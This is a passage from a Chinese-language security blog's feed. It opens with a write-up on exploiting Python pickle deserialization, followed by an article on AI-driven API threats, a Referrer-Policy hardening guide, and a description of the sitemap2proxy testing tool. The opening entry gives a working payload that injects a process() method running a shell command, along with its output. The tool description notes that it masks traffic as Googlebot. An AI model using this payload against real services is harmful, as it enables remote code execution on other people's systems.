&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;b64data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Pickled object: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;item&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;item&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Result: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当无法通过stdout获取输出且禁止外连时，可通过以下方式构造满足要求的载荷（要求反序列化对象必须具有返回可解码字节串的&lt;code&gt;.process()&lt;/code&gt;方法）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pickle&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__reduce__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(a:=type(&amp;#34;A&amp;#34;, (object,), &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;),b:=a(),b.__setattr__(&amp;#34;process&amp;#34;, lambda: __import__(&amp;#34;subprocess&amp;#34;).check_output(&amp;#34;id&amp;#34;)),b)[-1]&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键Python表达式解析：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,),&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}),&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 动态创建新类型A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;                       &lt;span class=&#34;c1&#34;&gt;# 实例化A类型对象&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;fm&#34;&gt;__setattr__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;process&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;# 动态添加process方法&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;lambda&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;__import__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;subprocess&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;                             &lt;span class=&#34;c1&#34;&gt;# 返回构造完成的对象&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;执行效果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Pickled object: gASVlAAAA...（略）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Result: uid=1000(zetatwo) gid=1000(zetatwo) groups=1000(zetatwo)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该方法为Python反序列化漏洞利用提供了更灵活的载荷构造方式，特别适用于存在特殊约束条件的攻击场景。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>超越传统威胁：AI驱动的API漏洞崛起</title>
        <link>http://localhost:1313/p/%E8%B6%85%E8%B6%8A%E4%BC%A0%E7%BB%9F%E5%A8%81%E8%83%81ai%E9%A9%B1%E5%8A%A8%E7%9A%84api%E6%BC%8F%E6%B4%9E%E5%B4%9B%E8%B5%B7/</link>
        <pubDate>Mon, 04 Aug 2025 02:03:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B6%85%E8%B6%8A%E4%BC%A0%E7%BB%9F%E5%A8%81%E8%83%81ai%E9%A9%B1%E5%8A%A8%E7%9A%84api%E6%BC%8F%E6%B4%9E%E5%B4%9B%E8%B5%B7/</guid>
        <description>&lt;h3 id=&#34;ai对api安全格局的颠覆性影响&#34;&gt;AI对API安全格局的颠覆性影响
&lt;/h3&gt;&lt;p&gt;人工智能已深刻改变各行业，API安全领域亦不例外。传统防御手段主要针对已知威胁，但随着AI技术普及，自动化攻击工具、AI生成的漏洞利用代码以及业务逻辑滥用等问题使安全形势复杂化。根据Wallarm《2025年API威胁统计报告》，2024年AI相关CVE漏洞数量激增，其中98.9%直接关联API系统。&lt;/p&gt;
&lt;h3 id=&#34;ai加剧的api风险特征&#34;&gt;AI加剧的API风险特征
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;弱认证机制&lt;/strong&gt;：89%的AI驱动API仍使用静态密钥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;暴露端点问题&lt;/strong&gt;：57%的AI相关API存在未受控的公开访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;新型漏洞类别&lt;/strong&gt;：二进制API和硬件级处理导致内存损坏漏洞激增&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ai驱动的自适应攻击技术解析&#34;&gt;AI驱动的自适应攻击技术解析
&lt;/h3&gt;&lt;p&gt;攻击者利用AI实现四阶段攻击链：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;API行为自动化分析&lt;/strong&gt;：通过监控响应模式识别业务逻辑弱点&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;业务逻辑逆向工程&lt;/strong&gt;：定位授权漏洞如BOLA（对象级授权缺陷）和BFLA（功能级授权缺陷）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实时规避检测&lt;/strong&gt;：攻击机器人可动态修改请求参数，绕过传统签名检测机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;行为伪装&lt;/strong&gt;：模拟正常用户流量，需上下文感知技术才能识别&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;构建ai弹性防御体系&#34;&gt;构建AI弹性防御体系
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;实时异常检测&lt;/strong&gt;：采用Wallarm等具备行为分析能力的平台，通过持续学习应对新型威胁&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强化认证体系&lt;/strong&gt;：识别未受保护的API端点，发现权限控制漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全量API资产治理&lt;/strong&gt;：通过自动化发现工具管理影子API和僵尸API&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SOC即服务&lt;/strong&gt;：结合专利AI/ML技术提供实时阻断和威胁狩猎能力&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;案例显示，采用AI增强防御方案的企业可将API攻击响应时间缩短83%。建议通过&lt;a class=&#34;link&#34; href=&#34;https://www.wallarm.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Wallarm演示&lt;/a&gt;了解具体实施方案。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>如何修复网站缺失的Referrer-Policy安全头</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E7%BD%91%E7%AB%99%E7%BC%BA%E5%A4%B1%E7%9A%84referrer-policy%E5%AE%89%E5%85%A8%E5%A4%B4/</link>
        <pubDate>Mon, 04 Aug 2025 01:41:41 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E7%BD%91%E7%AB%99%E7%BC%BA%E5%A4%B1%E7%9A%84referrer-policy%E5%AE%89%E5%85%A8%E5%A4%B4/</guid>
        <description>&lt;h1 id=&#34;如何修复网站缺失的referrer-policy安全头&#34;&gt;如何修复网站缺失的Referrer-Policy安全头
&lt;/h1&gt;&lt;h2 id=&#34;referrer-policy是什么&#34;&gt;Referrer-Policy是什么？
&lt;/h2&gt;&lt;p&gt;Referrer-Policy是一种安全头部，应包含在网站服务器与客户端的通信中。该策略指示浏览器当用户点击跳转链接时，如何处理发送给目标站点的来源信息。可配置为不传递任何URL信息、部分信息或完整路径。最佳实践推荐强制设置该策略，可通过PHP等网站代码或Apache配置实现。&lt;/p&gt;
&lt;h2 id=&#34;检查referrer-policy是否启用&#34;&gt;检查Referrer-Policy是否启用
&lt;/h2&gt;&lt;p&gt;未主动配置的网站通常缺失该头部，可通过&lt;a class=&#34;link&#34; href=&#34;https://www.securityheaders.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SecurityHeaders.io&lt;/a&gt;扫描检测，或使用FireFox开发者控制台验证。&lt;/p&gt;
&lt;h2 id=&#34;确定referrer策略需求&#34;&gt;确定Referrer策略需求
&lt;/h2&gt;&lt;p&gt;用户离开网站时，目标服务器可能需要来源信息（用于广告分析等），但也需防止HTTPS URL泄露到非安全HTTP环境。推荐采用&amp;quot;no-referrer-when-downgrade&amp;quot;策略，确保从HTTPS跳转HTTP时不暴露原始URL路径。&lt;/p&gt;
&lt;h2 id=&#34;apache配置步骤&#34;&gt;Apache配置步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;在&lt;code&gt;httpd.conf&lt;/code&gt;中找到VirtualHost配置段&lt;/li&gt;
&lt;li&gt;定位或创建&lt;code&gt;&amp;lt;IfModule headers_module&amp;gt;&lt;/code&gt;区块&lt;/li&gt;
&lt;li&gt;添加头部指令：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-apache&#34; data-lang=&#34;apache&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;IfModule&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;headers_module&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Header&lt;/span&gt; set Referrer-Policy &lt;span class=&#34;s2&#34;&gt;&amp;#34;no-referrer-when-downgrade&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;重启Apache服务：&lt;code&gt;sudo service apache restart&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;扩展资源&#34;&gt;扩展资源
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://scotthelme.co.uk/a-new-security-header-referrer-policy/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Scott Helme的Referrer Policy详解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;安全头部检测工具：&lt;a class=&#34;link&#34; href=&#34;https://www.securityheaders.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SecurityHeaders.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;关联阅读：&lt;a class=&#34;link&#34; href=&#34;#&#34; &gt;内容安全策略(CSP)配置指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>sitemap2proxy：将网站地图转换为代理请求的Ruby工具</title>
        <link>http://localhost:1313/p/sitemap2proxy%E5%B0%86%E7%BD%91%E7%AB%99%E5%9C%B0%E5%9B%BE%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%A3%E7%90%86%E8%AF%B7%E6%B1%82%E7%9A%84ruby%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 04 Aug 2025 01:20:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sitemap2proxy%E5%B0%86%E7%BD%91%E7%AB%99%E5%9C%B0%E5%9B%BE%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%A3%E7%90%86%E8%AF%B7%E6%B1%82%E7%9A%84ruby%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h1 id=&#34;sitemap2proxy&#34;&gt;sitemap2proxy
&lt;/h1&gt;&lt;p&gt;当进行Web应用测试时，通常需要爬取目标网站。但如果网站能主动告诉你大部分内容呢？许多网站通过&lt;code&gt;sitemap.xml&lt;/code&gt;文件向搜索引擎蜘蛛（如Google）公开其内容。&lt;/p&gt;
&lt;p&gt;该脚本解析该文件提取所有URL，并通过你选择的代理（Burp、ZAP等）发起请求。虽然无法发现文件中未提及的内容或进行暴力破解，但能快速识别网站管理员希望公开的所有页面。&lt;/p&gt;
&lt;p&gt;Tim Tomes开发的&lt;code&gt;pagefinder&lt;/code&gt;是该脚本的良好补充，可检查多个站点以寻找sitemap和/或robots.txt文件。&lt;/p&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;sitemap2proxy&lt;/code&gt;是简单的Ruby脚本，无需安装额外gem。只需赋予可执行权限即可。&lt;/p&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用
&lt;/h2&gt;&lt;p&gt;用法非常简单，可指定已下载的sitemap或直接指向网站上的文件。支持原始XML(sitemap.xml)和gzip压缩文件(sitemap.xml.gz)。另一个必要参数是代理URL。&lt;/p&gt;
&lt;p&gt;默认使用Googlebot用户代理字符串以隐藏日志中的流量，可通过&lt;code&gt;ua&lt;/code&gt;参数自定义。&lt;/p&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例
&lt;/h3&gt;&lt;p&gt;获取Google的sitemap.xml并通过本地8080端口代理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./sitemap2proxy.rb --url http://www.google.com/sitemap.xml --proxy http://localhost:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
